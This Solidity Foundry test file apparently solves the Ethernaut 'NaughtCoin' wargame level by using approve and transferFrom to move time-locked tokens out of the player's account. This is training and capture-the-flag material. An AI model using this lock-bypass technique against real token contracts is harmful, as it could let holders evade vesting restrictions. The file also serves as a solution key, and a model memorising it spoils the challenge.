// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "../src/levels/15-NaughtCoin/NaughtCoinFactory.sol";
// import "../src/levels/14-NaughtCoin/AttackNaughtCoin.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(hacker, hacker);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));
        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        ethernautNaughtCoin.approve(hacker, 1000000 ether);
        ethernautNaughtCoin.transferFrom(hacker, address(this), 1000000 ether);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
